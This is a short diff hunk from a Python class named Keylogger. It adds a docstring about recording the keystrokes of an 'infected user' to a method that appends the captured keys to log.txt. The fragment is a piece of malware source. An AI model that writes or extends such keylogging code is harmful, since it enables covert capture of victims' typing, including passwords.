@@ -27,8 +27,10 @@ class Keylogger():
 
 
     def write_file(self):
+        """Write a function with the keystrokes made by infected user"""
 
         self.lock.acquire()
+        
         try:
             with open("log.txt", "a+") as f:
                 for key in self.keys:
